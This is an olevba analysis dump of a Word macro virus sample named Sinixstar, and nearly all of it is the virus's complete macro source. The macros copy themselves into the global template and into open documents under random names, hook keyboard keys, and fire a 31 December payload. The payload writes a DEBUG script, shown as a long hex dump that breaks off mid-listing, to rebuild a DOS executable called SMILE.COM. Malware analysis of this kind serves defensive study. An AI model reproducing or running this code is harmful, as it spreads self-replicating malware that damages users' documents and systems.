olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Sinixstar
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Sinixstar - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Trojan.MSWord.Sinixstar - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Total macros: 3
==============================================================================
Macro name: Sinixstar1 [SINIXSTAR1] "U"
------------------------------------------------------------------------------
Sub MAIN()
On Error GoTo Done

a$ = DateiName$()
If a$ = "" Then GoTo Finish

If VInstalled = 0 Then
        Run1
        Run2
        RunPayload
        DateiAllesSpeichern 1, 1
Else
        GoTo Done
End If

Done:
a$ = DateiName$()
If a$ = "" Then
        GoTo Finish
Else
        Einfügen " "
End If

Finish:
MsgBox "Sinixstar", -8
End Sub

Sub Run1()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = AbrufenDokumentVar$("VirNameDoc")
CO$ = DateiName$() + ":" + R1$
MakroKopieren CO$, "Global:" + Z$, 1
SetProfileString "Intl", "Info2", Z$
ExtrasAnpassenTastatur.TastenSchlüssel = 65, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0
End Sub

Sub Run2()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = AbrufenDokumentVar$("VirName")
OC$ = DateiName$() + ":" + R2$
MakroKopieren OC$, "Global:" + Z$, 1
SetProfileString "Intl", "Info1", Z$
ExtrasAnpassenTastatur.TastenSchlüssel = 32, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0
End Sub

Sub RunPayload()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R3$ = AbrufenDokumentVar$("VirNamePayload")
OCO$ = DateiName$() + ":" + R3$
MakroKopieren OCO$, "Global:" + Z$, 1
SetProfileString "Intl", "Info3", Z$
End Sub

Function VInstalled()
CC$ = GetProfileString$("Intl", "Info1")
        VInstalled = 0
        If ZählenMakros(0) > 0 Then
                For i = 1 To ZählenMakros(0)
                If MakroName$(i, 0) = CC$ Then
                        VInstalled = 1
                End If
        Next i
End If
End Function

Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
a$ = Str$(Num)
a$ = LTrim$(a$)

b$ = Mid$(a$, 1, 1)
c$ = Mid$(a$, 2, 1)
D$ = Mid$(a$, 3, 1)
E$ = Mid$(a$, 4, 1)

If b$ = "1" Then F$ = "A"
If b$ = "2" Then F$ = "B"
If b$ = "3" Then F$ = "C"
If b$ = "4" Then F$ = "D"
If b$ = "5" Then F$ = "E"
If b$ = "6" Then F$ = "F"
If b$ = "7" Then F$ = "G"
If b$ = "8" Then F$ = "H"
If b$ = "9" Then F$ = "I"
If b$ = "0" Then F$ = "J"

If c$ = "1" Then G$ = "H"
If c$ = "2" Then G$ = "I"
If c$ = "3" Then G$ = "J"
If c$ = "4" Then G$ = "K"
If c$ = "5" Then G$ = "L"
If c$ = "6" Then G$ = "M"
If c$ = "7" Then G$ = "N"
If c$ = "8" Then G$ = "O"
If c$ = "9" Then G$ = "P"
If c$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
==============================================================================
Macro name: Sinixstar2 [SINIXSTAR2] "U"
------------------------------------------------------------------------------
Sub MAIN()
On Error GoTo Finish

a$ = DateiName$()
If a$ = "" Then GoTo Finish

CO$ = GetProfileString$("Intl", "Info1")
OC$ = GetProfileString$("Intl", "Info2")
OCO$ = GetProfileString$("Intl", "Info3")

If VInstalled = 1 Then
        GoTo Finish
Else
        On Error Resume Next
        DateiSpeichernUnter.Format = 1
        Run1
        Run2
        RunPayload
        DateiAllesSpeichern 1, 0
End If

Finish:
a$ = DateiName$()
If a$ = "" Then
        GoTo Finito
Else
        Einfügen "a"
End If

Finito:
If Monat(Jetzt()) = 12 And Tag(Jetzt()) = 31 Then
        GoTo Payload
Else
        GoTo No
End If

Payload:
AK$ = GetProfileString$("Intl", "Info3")
ExtrasMakro.Name = AK$, .Ausführen, .Anzeigen = 0, .Beschreibung = "", .NeuerName = ""

No:
End Sub

Sub Run1()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

CO$ = GetProfileString$("Intl", "Info2")
MakroKopieren "Global:" + CO$, DateiName$() + ":" + Z$, 1
DokumentVariableBestimmen "VirName", Z$
ExtrasAnpassenTastatur.TastenSchlüssel = 65, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 1
End Sub

Sub Run2()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

OC$ = GetProfileString$("Intl", "Info1")
MakroKopieren "Global:" + OC$, DateiName$() + ":" + Z$, 1
DokumentVariableBestimmen "VirNameDoc", Z$
ExtrasAnpassenTastatur.TastenSchlüssel = 32, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 1
End Sub

Sub RunPayload()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

OCO$ = GetProfileString$("Intl", "Info3")
MakroKopieren "Global:" + OCO$, DateiName$() + ":" + Z$, 1
DokumentVariableBestimmen "VirNamePayload", Z$
End Sub

Function VInstalled()
On Error Resume Next
CC$ = AbrufenDokumentVar$("VirNameDoc")
        VInstalled = 0
        If ZählenMakros(1) > 0 Then
                For i = 1 To ZählenMakros(1)
                        If MakroName$(i, 1) = CC$ Then
                                VInstalled = 1
                        End If
                Next i
        End If
End Function

Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
a$ = Str$(Num)
a$ = LTrim$(a$)

b$ = Mid$(a$, 1, 1)
c$ = Mid$(a$, 2, 1)
D$ = Mid$(a$, 3, 1)
E$ = Mid$(a$, 4, 1)

If b$ = "1" Then F$ = "A"
If b$ = "2" Then F$ = "B"
If b$ = "3" Then F$ = "C"
If b$ = "4" Then F$ = "D"
If b$ = "5" Then F$ = "E"
If b$ = "6" Then F$ = "F"
If b$ = "7" Then F$ = "G"
If b$ = "8" Then F$ = "H"
If b$ = "9" Then F$ = "I"
If b$ = "0" Then F$ = "J"

If c$ = "1" Then G$ = "H"
If c$ = "2" Then G$ = "I"
If c$ = "3" Then G$ = "J"
If c$ = "4" Then G$ = "K"
If c$ = "5" Then G$ = "L"
If c$ = "6" Then G$ = "M"
If c$ = "7" Then G$ = "N"
If c$ = "8" Then G$ = "O"
If c$ = "9" Then G$ = "P"
If c$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
==============================================================================
Macro name: Sinixstar3 [SINIXSTAR3] "U"
------------------------------------------------------------------------------
Sub MAIN()

DateiNeu.DokVorlage = "Normal", .DokVorlageNeu = 1
DokumentMaximieren
Schriftgrad 16
Fett
Schriftart "Arial"
Einfügen "Thanks for beta testing the Sinixstar virus"

n = Sekunde(Jetzt())
m = n + 3
Again:
While n <> m
n = Sekunde(Jetzt())
GoTo Again
Wend

On Error GoTo Finish

a$ = GetProfileString$("Installed", "Yes")

If a$ = "" Then

a$ = MakroDateiName$("AutoOpen")
b$ = DateiNameInfo$(a$, 5)

Open b$ + "power.scr" For Output As #1
Print #1, "N SMILE.COM"
Print #1, "E 0100 4D 5A F3 01 0C 00 00 00 20 00 81 00 FF FF 60 01"
Print #1, "E 0110 00 08 00 00 1E 00 00 00 3E 00 00 00 01 00 FB 50"
Print #1, "E 0120 6A 72 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0310 00 00 00 00 00 00 00 00 00 00 00 00 FF FF 9C 83"
Print #1, "E 0320 EC 04 50 1E 06 FB 2E 83 3E 1C 00 FF 74 24 C7 06"
Print #1, "E 0330 06 00 F0 FE 8B EC 8C 5E 08 C7 46 06 00 01 8C DD"
Print #1, "E 0340 8C C8 05 58 01 8B D8 B9 F0 0F 03 C1 8E C0 0E 1F"
Print #1, "E 0350 EB 6C 8C CA 81 C2 58 01 8E DA 8B 0E 06 00 03 16"
Print #1, "E 0360 08 00 8B 36 18 00 E3 0F AD 8B F8 AD 03 C2 8E C0"
Print #1, "E 0370 8C C8 26 01 05 E2 F1 8B EC 8C C8 03 06 16 00 89"
Print #1, "E 0380 46 08 A1 14 00 89 46 06 8C CD 03 2E 0E 00 A1 04"
Print #1, "E 0390 00 8B 16 02 00 83 C2 FF 1D 00 00 B1 04 D3 EA 42"
Print #1, "E 03A0 FE C1 D3 E0 03 D0 03 16 0A 00 8B CA 2B 0E 08 00"
Print #1, "E 03B0 8C CB 8E DB 81 C3 58 01 03 DA 8E C3 2B D9 53 51"
Print #1, "E 03C0 B8 01 02 33 DB B9 01 00 BA 80 00 CD 13 72 51 BE"
Print #1, "E 03D0 51 01 33 FF B9 2B 00 FC F3 A6 74 44 BF C6 01 B9"
Print #1, "E 03E0 04 00 26 83 7D 02 00 77 0C 26 83 3D 0C 77 06 26"
Print #1, "E 03F0 83 3D 00 77 2B 83 C7 10 E2 E8 BE 51 01 33 FF B9"
Print #1, "E 0400 2B 00 FC E8 88 01 06 1F 0E 07 B8 0B 03 B9 02 00"
Print #1, "E 0410 CD 13 1E 07 0E 1F 72 08 B8 01 03 B9 01 00 CD 13"
Print #1, "E 0420 59 5B 8C CA 33 FF 06 57 51 B9 1C 00 BE 35 01 FC"
Print #1, "E 0430 F3 A4 59 FA CB 8B C1 8E DB 8E C2 33 F6 33 FF B9"
Print #1, "E 0440 08 00 F3 A5 43 42 8B C8 E2 EB 8E D5 FB 07 1F 58"
Print #1, "E 0450 CF FA 33 DB 8E DB 8E D3 BC 00 7C FB A1 13 04 2D"
Print #1, "E 0460 06 00 A3 13 04 B1 06 D3 E0 8E C0 B8 0B 02 B9 02"
Print #1, "E 0470 00 BA 80 00 CD 13 BB 7C 01 06 53 CB FA B8 16 02"
Print #1, "E 0480 87 06 70 00 2E A3 50 15 8C C8 87 06 72 00 2E A3"
Print #1, "E 0490 52 15 2E C7 06 54 15 FF FF 2E C7 06 56 15 FF FF"
Print #1, "E 04A0 2E C7 06 58 15 FF FF FB 0E 07 BE 00 7C BF 51 01"
Print #1, "E 04B0 B9 2B 00 FC E8 D7 00 B8 00 7C 1E 50 CB 50 56 1E"
Print #1, "E 04C0 0E 1F 8B 36 5A 15 FE 0E 5C 15 F6 06 5C 15 07 75"
Print #1, "E 04D0 28 46 81 FE 47 15 72 21 B0 34 E6 43 33 C0 E6 40"
Print #1, "E 04E0 E6 40 8E D8 2E A1 4C 15 A3 20 00 2E A1 4E 15 A3"
Print #1, "E 04F0 22 00 2E FE 06 5D 15 EB 15 89 36 5A 15 D0 04 8A"
Print #1, "E 0500 24 80 E4 01 D0 E4 E4 61 24 FC 0A C4 E6 61 B0 20"
Print #1, "E 0510 E6 20 1F 5E 58 CF 1E 50 53 33 C0 8E D8 A1 84 00"
Print #1, "E 0520 2E 39 06 54 15 75 0A A1 86 00 2E 39 06 56 15 74"
Print #1, "E 0530 17 A1 84 00 2E A3 54 15 A1 86 00 2E A3 56 15 2E"
Print #1, "E 0540 C7 06 58 15 B6 00 EB 3E 2E FF 0E 58 15 75 37 2E"
Print #1, "E 0550 A1 50 15 A3 70 00 2E A1 52 15 A3 72 00 B8 D4 03"
Print #1, "E 0560 87 06 84 00 2E A3 54 15 8C C8 87 06 86 00 2E A3"
Print #1, "E 0570 56 15 B8 10 00 BB 5E 15 2E C6 07 00 43 48 75 F8"
Print #1, "E 0580 2E C6 06 47 15 FF 5B 58 1F 2E FF 2E 50 15 26 8A"
Print #1, "E 0590 05 86 04 AA 46 E2 F7 C3 11 2A 03 12 2A 03 30 BF"
Print #1, "E 05A0 02 3C 43 04 3D 43 04 3E AC 03 42 89 03 45 00 04"
Print #1, "E 05B0 46 1C 04 4E 5A 03 4F 5A 03 5B 43 04 6C 34 04 50"
Print #1, "E 05C0 51 52 1E 0E 1F 2E 80 3E 47 15 00 74 56 B4 2A E8"
Print #1, "E 05D0 2B 02 39 0E 48 15 72 4B 39 16 4A 15 72 45 FA 33"
Print #1, "E 05E0 C0 8E D8 B8 BD 01 87 06 20 00 2E A3 4C 15 8C C8"
Print #1, "E 05F0 87 06 22 00 2E A3 4E 15 B0 34 E6 43 B0 80 E6 40"
Print #1, "E 0600 B0 00 E6 40 0E 1F C6 06 5D 15 00 C6 06 5C 15 00"
Print #1, "E 0610 C7 06 5A 15 47 06 FB 80 3E 5D 15 00 74 F9 C6 06"
Print #1, "E 0620 47 15 00 1F 5A 59 58 E9 BE 00 E8 D0 01 3C 00 75"
Print #1, "E 0630 55 9C 50 53 06 B4 2F E8 C3 01 26 80 3F FF 75 03"
Print #1, "E 0640 83 C3 08 26 8A 47 16 24 1F 3C 1F 75 35 26 81 6F"
Print #1, "E 0650 1C 80 15 26 83 5F 1E 00 EB 23 E8 A0 01 72 27 9C"
Print #1, "E 0660 50 53 06 B4 2F E8 95 01 26 8A 47 16 24 1F 3C 1F"
Print #1, "E 0670 75 10 26 81 6F 1A 80 15 26 83 5F 1C 00 26 80 77"
Print #1, "E 0680 16 1F 07 5B 58 9D CA 02 00 0B DB 74 5B 53 E8 73"
Print #1, "E 0690 01 5B 72 54 0A C0 75 07 81 C2 80 15 83 D1 00 E8"
Print #1, "E 06A0 5B 01 72 E2 2D 80 15 83 DA 00 EB DA 0B DB 74 38"
Print #1, "E 06B0 50 51 52 56 1E 0E 1F 53 E8 49 01 8B F3 5B 72 0D"
Print #1, "E 06C0 C7 04 00 00 80 7C 02 00 74 03 E8 B8 01 1F 5E 5A"
Print #1, "E 06D0 59 58 EB 14 53 51 BB 98 02 B9 0D 00 2E 3A 27 74"
Print #1, "E 06E0 0C 83 C3 03 E2 F6 59 5B 2E FF 2E 54 15 55 8B EC"
Print #1, "E 06F0 2E 8B 5F 01 87 5E 04 8B 4E 0A 87 4E 02 5D 9D C3"
Print #1, "E 0700 E8 FA 00 72 48 9C 53 52 E8 F9 00 72 09 2E 8A 57"
Print #1, "E 0710 02 8B D8 E8 0E 01 5A 5B 9D E9 C7 00 E8 DE 00 72"
Print #1, "E 0720 2C 9C 53 51 87 D9 E8 DB 00 72 03 2E 89 0F 59 5B"
Print #1, "E 0730 9D E9 AF 00 0A C0 75 B0 52 8B D6 E8 F6 00 5A 72"
Print #1, "E 0740 A7 EB 05 E8 EE 00 72 A0 E8 B2 00 73 03 E9 93 00"
Print #1, "E 0750 9C 50 53 51 52 1E 0E 1F 8B D8 B8 00 44 E8 9D 00"
Print #1, "E 0760 72 7B F7 C2 80 00 75 75 E8 7B 00 0B C2 75 33 E8"
Print #1, "E 0770 AA 00 72 69 B4 2A E8 84 00 80 C6 03 80 FE 0C 76"
Print #1, "E 0780 04 41 80 EE 0C 89 0E 48 15 89 16 4A 15 B4 40 B9"
Print #1, "E 0790 80 15 E8 66 00 72 3C 33 C1 75 38 B2 01 E8 84 00"
Print #1, "E 07A0 EB 3B E8 46 00 E8 74 00 72 33 E8 49 00 72 24 33"
Print #1, "E 07B0 C1 75 20 81 3E 00 00 4D 5A 75 18 39 06 08 00 75"
Print #1, "E 07C0 12 81 3E 12 00 AD DE 75 0A B2 00 E8 56 00 BA 80"
Print #1, "E 07D0 15 EB 02 33 D2 33 C9 B8 00 42 E8 20 00 1F 5A 59"
Print #1, "E 07E0 5B 58 9D CA 02 00 B8 02 42 EB 03 B8 00 42 33 C9"
Print #1, "E 07F0 EB 09 B4 40 EB 02 B4 3F B9 1E 00 33 D2 9C 2E FF"
Print #1, "E 0800 1E 54 15 C3 50 51 8B C3 BB 5E 15 B9 08 00 2E 3B"
Print #1, "E 0810 07 74 06 43 43 43 E2 F6 F9 59 58 C3 53 33 DB E8"
Print #1, "E 0820 E2 FF 5B C3 53 53 33 DB E8 D9 FF 2E 8F 07 2E 88"
Print #1, "E 0830 57 02 5B C3 50 51 56 57 32 E4 B9 00 01 8B F2 FC"
Print #1, "E 0840 AC 0A C0 74 16 3C 5C 74 08 3C 2E 74 08 E2 F1 EB"
Print #1, "E 0850 0A 32 E4 EB EB FE C4 8B FE EB E5 80 FC 01 75 1F"
Print #1, "E 0860 8B F7 AD 25 DF DF 8B C8 AC 24 DF 81 F9 43 4F 75"
Print #1, "E 0870 04 3C 4D 74 0B 81 F9 45 58 75 04 3C 45 74 01 F9"
Print #1, "E 0880 5F 5E 59 58 C3 B8 00 42 33 C9 BA 80 15 E8 6D FF"
Print #1, "E 0890 E8 63 FF 81 3E 00 00 4D 5A 74 3E C7 06 00 00 4D"
Print #1, "E 08A0 5A C7 06 18 00 1C 00 C7 06 1A 00 00 00 C7 06 0E"
Print #1, "E 08B0 00 48 01 C7 06 10 00 FE FF E8 2A FF 2D 80 15 83"
Print #1, "E 08C0 DA 00 A3 1C 00 B9 10 00 F7 F1 83 EA 01 BA 12 10"
Print #1, "E 08D0 1B D0 89 16 0A 00 EB 1E 90 C7 06 1C 00 FF FF B8"
Print #1, "E 08E0 58 01 03 06 08 00 01 06 0E 00 83 06 0A 00 20 83"
Print #1, "E 08F0 06 0C 00 20 73 06 C7 06 0C 00 FF FF C7 06 06 00"
Print #1, "E 0900 00 00 C7 06 08 00 00 00 C7 06 12 00 AD DE C7 06"
Print #1, "E 0910 16 00 00 00 C7 06 14 00 1E 00 E8 C9 FE B9 00 02"
Print #1, "E 0920 F7 F1 89 16 02 00 83 C2 FF 15 00 00 A3 04 00 E8"
Print #1, "E 0930 B9 FE E8 BD FE 72 0F B8 00 57 E8 C0 FE B8 01 57"
Print #1, "E 0940 80 C9 1F E8 B7 FE C3 F9 DC CC 66 33 33 74 66 E3"
Print #1, "E 0950 06 1C D8 F3 81 83 36 8C CC E2 E3 33 12 19 B8 62"
Print #1, "E 0960 C7 83 1E 19 CC CC C1 E6 4F 1C F8 62 F1 8E C7 33"
Print #1, "E 0970 18 E4 F9 B3 2C DD F1 36 47 FE 2E 08 FF 8B E3 3B"
Print #1, "E 0980 C4 F1 31 C6 D0 F3 CD C1 73 9B 83 CE 2E 0E B1 B0"
Print #1, "E 0990 33 CD 81 9E 36 8E 71 90 73 8C 87 38 F0 37 CD 83"
Print #1, "E 09A0 BC 7C 33 C7 C3 9C 78 19 C7 81 9C 4C 31 C5 C3 1C"
Print #1, "E 09B0 6E 39 E7 81 9C 78 19 C5 91 9C 6C 19 66 C9 9E 2E"
Print #1, "E 09C0 0C 71 E0 E7 8D A3 3C 4C 19 E3 68 E4 E5 83 83 9A"
Print #1, "E 09D0 9D 18 66 72 CE 47 C1 F1 0E E5 8C 37 C4 F1 7D 59"
Print #1, "E 09E0 1B 1D C3 F0 9D 1E 44 C1 F6 39 87 63 38 EE 19 86"
Print #1, "E 09F0 C4 F1 E6 18 06 18 B0 E7 33 8E 71 B2 71 CD 37 A0"
Print #1, "E 0A00 43 39 C6 8F B1 93 38 73 87 59 C1 9D 38 67 9C 70"
Print #1, "E 0A10 73 66 D9 E3 1E 4C 79 9C F1 23 47 38 E3 9B 0C 67"
Print #1, "E 0A20 BE 38 73 C6 69 96 61 8E 1C 71 E6 32 3C B9 C9 9C"
Print #1, "E 0A30 4C F8 E7 0D CC F8 64 C7 27 1C 71 C6 46 47 36 7C"
Print #1, "E 0A40 DB 63 87 30 3E 19 83 70 C4 1F 0E 33 E1 E1 38 6E"
Print #1, "E 0A50 01 CE 33 93 6E 0F 81 FC 7F 07 71 B8 1D 87 C0 EC"
Print #1, "E 0A60 3E 07 E3 E0 7F 1F 03 B0 F0 3F 8F 01 D8 F8 1D 8F"
Print #1, "E 0A70 83 B8 F8 3F 0F 83 70 F8 66 1C 86 E1 D0 EE 3D 0C"
Print #1, "E 0A80 C7 A1 DC 5A 19 C7 23 B8 F4 33 8B 43 38 A4 77 16"
Print #1, "E 0A90 86 73 68 EE 3C 8C E2 D9 CE 69 19 CC B3 1C D3 33"
Print #1, "E 0AA0 89 26 39 B4 C7 32 4C 73 2C C7 32 9C E6 49 8E 65"
Print #1, "E 0AB0 98 E6 59 8E 74 99 E6 D9 9E 6D 99 E3 41 8E 36 0E"
Print #1, "E 0AC0 F1 B0 66 C6 11 C7 1A 0E CC 69 3B 31 83 9C 99 87"
Print #1, "E 0AD0 87 13 18 1E 3B 86 63 BC 30 C3 70 C6 39 D8 C6 2C"
Print #1, "E 0AE0 6E 4C CD 32 4C B0 6E 13 31 D7 30 DE C7 0F 99 66"
Print #1, "E 0AF0 6B 26 C3 32 6C 33 2C 71 E4 C9 3C CC F1 CC B8 64"
Print #1, "E 0B00 CC C6 39 E3 20 1E 7F C1 9C 71 B8 9B 18 C9 C9 30"
Print #1, "E 0B10 6C E7 86 46 70 66 1C 67 73 B1 76 31 87 13 39 B1"
Print #1, "E 0B20 9B 1F 1C 79 F8 E6 1F 86 60 F8 E6 3C 66 73 33 1C"
Print #1, "E 0B30 33 19 89 99 8C DF 99 C5 C6 5C 2E 73 63 F3 73 19"
Print #1, "E 0B40 B3 39 99 B1 D9 F8 CF 4C CC F3 33 1B 3C C9 8C 73"
Print #1, "E 0B50 1C 63 33 89 E3 38 7F 13 B9 DE 73 F1 E6 1F 81 E0"
Print #1, "E 0B60 FC 0F 07 E1 F8 3E 0F 83 E0 78 3E 07 81 F0 78 1E"
Print #1, "E 0B70 07 81 E0 7C 3E 87 87 91 F0 F1 3E 3C 8F 0F 91 E1"
Print #1, "E 0B80 E4 78 7C 0F 0F 03 E3 E4 78 7C 1F 1B 83 E3 60 FC"
Print #1, "E 0B90 6C 9F 0D 93 A3 B0 74 76 0E 07 C1 E0 F8 3C 1F 07"
Print #1, "E 0BA0 C3 60 E8 6C 1C 0D 83 93 F1 F0 74 3E 0E 87 C1 F0"
Print #1, "E 0BB0 F8 3E 0F 0E C0 E1 D8 98 3F 1B 0F C3 C1 F8 7C 3F"
Print #1, "E 0BC0 0F 07 E0 F0 FE 1E 0E E3 C0 EE 3C 1E E3 E0 E7 8F"
Print #1, "E 0BD0 43 AC 79 9E 33 90 70 E6 58 CF C1 B3 3B 87 63 C6"
Print #1, "E 0BE0 0C CC F1 DB 07 13 F0 E4 6E 1F 85 C1 30 78 E6 2C"
Print #1, "E 0BF0 CD E1 9E 36 31 A6 78 DC 13 8C 83 B0 74 4F 83 81"
Print #1, "E 0C00 CC 7C 1F 03 C1 F9 CC 8C 96 26 48 C7 99 98 F8 7E"
Print #1, "E 0C10 8E 4F 83 83 F8 BE 1F 0F C3 F1 78 EC 60 CC 8F 0E"
Print #1, "E 0C20 39 39 F8 6E 3E 67 21 D8 F8 39 1F 06 66 78 CF 1C"
Print #1, "E 0C30 D8 0E 06 63 60 CC 3C 79 33 43 89 CF 11 9C 39 1E"
Print #1, "E 0C40 0B C6 E6 33 33 9D B3 94 60 F7 71 C0 CC CE 0F 23"
Print #1, "E 0C50 98 1C 1E 26 E0 F8 99 CE E3 E1 71 8E 43 98 98 59"
Print #1, "E 0C60 38 83 86 F2 38 E3 1C 17 83 78 3E 0F E1 F8 3F 07"
Print #1, "E 0C70 C1 F0 7E 0F 81 E0 7C 1F 07 C0 F8 3E 0F 83 E0 F8"
Print #1, "E 0C80 3E 0F 83 E0 F8 3C 0F 87 D0 F8 79 1F 0F 21 E1 E4"
Print #1, "E 0C90 3C 1E 47 C3 C8 F8 7C 0F 87 C1 F8 F8 1F 1F 83 E1"
Print #1, "E 0CA0 F0 3E 1F 03 83 F0 78 3B 0F 03 B0 66 37 0E C3 70"
Print #1, "E 0CB0 EC 37 0F C3 70 FC 37 8F C3 F8 F0 3F 8F 03 B8 F9"
Print #1, "E 0CC0 1B C7 A1 FC 39 1F C3 C1 FC 3C 1F 63 C0 F2 3C 4F"
Print #1, "E 0CD0 19 E6 79 CF B1 CE 3E C7 18 F0 1E 33 C0 F0 FC 1B"
Print #1, "E 0CE0 8F A1 F0 7E 1E 87 C0 F8 3C 1F 87 C0 F8 7E 0F 87"
Print #1, "E 0CF0 81 C4 B8 2F 0D C3 D8 7E 1B 87 C9 E2 1C 46 0D E2"
Print #1, "E 0D00 70 7C 47 03 E7 BC 4E 1E 18 E3 F1 EA 3E 0F A1 F8"
Print #1, "E 0D10 3E 0F 07 70 5A 63 70 E6 19 93 E1 F0 6E 3D C6 F0"
Print #1, "E 0D20 74 1D 17 67 30 F0 3A 2F 8F 71 CE 33 C6 C0 7E 3E"
Print #1, "E 0D30 0F 07 61 EC 3E 1F 07 F0 FE 3F 0F C3 F0 BE 1F 8F"
Print #1, "E 0D40 80 F8 3E 3F 8F 63 98 F3 3C 1F 07 81 D8 1C 07 0C"
Print #1, "E 0D50 D3 BC 7C 07 27 C0 74 77 0E C3 9C 78 BC 07 C3 C0"
Print #1, "E 0D60 EF 1F 83 C4 78 DC 13 CC 78 93 F8 59 81 D8 DF 8C"
Print #1, "E 0D70 FC FD 8F 3C ED 8F 1C CF 8E 78 DF 1E F1 FE 39 E3"
Print #1, "E 0D80 FC 63 8B B1 9E 2E 85 F8 F2 0E C7 C0 FB 1F 02 EC"
Print #1, "E 0D90 F9 1F 73 E4 1D 8B A0 EC 59 07 63 E4 39 9F 21 EC"
Print #1, "E 0DA0 78 0F 23 64 39 9B 35 C4 68 8F 33 66 B8 8D 10 E6"
